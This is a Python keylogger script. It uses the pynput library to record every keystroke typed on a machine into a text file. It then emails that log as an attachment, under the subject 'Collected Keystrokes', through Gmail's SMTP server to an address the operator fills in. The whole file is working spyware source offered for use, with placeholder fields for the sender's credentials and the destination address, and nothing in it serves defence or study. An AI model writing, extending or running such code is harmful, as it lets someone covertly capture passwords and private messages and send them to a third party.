from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

key_log = "keylog_info.txt"
email_address = "Insert email address to be used"
password = "Insert PW for email address"
to_address = "Insert Email to send to"
key_log_file_path = "Insert absolute path to your keylog file"
path_extender = "\\"


def send_email(filename, attachment, to_address):
    from_address = email_address
    message = MIMEMultipart()

    message['From'] = from_address
    message['To'] = to_address
    message['Subject'] = "Collected Keystrokes"
    email_body = "Log information"
    message.attach(MIMEText(email_body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    base = MIMEBase('application', 'octet-stream')  # default MIMEbase code
    base.set_payload(attachment.read())
    encoders.encode_base64(base)

    # Adding email header
    base.add_header('Attachment: Filename =', filename)
    message.attach(base)

    # Starting SMTP session
    session = smtplib.SMTP('smtp.gmail.com', 587)  # defines the smtp session for gmail and the port # to use
    session.ehlo()
    session.starttls()  # starts a TLS service to secure the information

    # Logging into gmail account with
    session.login(from_address, password)  # logs into the gmail account to send/receive log file
    message_string = message.as_string()

    # Sending the email
    session.sendmail(from_address, to_address, message_string)
    session.quit()


send_email(key_log, key_log_file_path + path_extender + key_log, to_address)


count = 0
keys_list = []


def key_press(key):
    global keys_list, count

    print(key)
    keys_list.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_to_file(keys_list)
        keys_list = []


def write_to_file(keys):
    with open("Keylog_info.txt", 'a') as file:  # simplify this
        for key in keys:
            character = str(key).replace("'", "")  # replacing '' with nothing (formatting)
            if character.find("space") > 0:
                file.write('\n')  # creates a new line after each space. Necessary?
                file.close()
            elif character.find("Key") == -1:
                file.write(character)
                file.close()


def key_release(key):  # If the esc key is pressed it will return False and exit keylogger
    if key == Key.esc:
        return False


with Listener(on_press=key_press, on_release=key_release) as listen:
    listen.join()
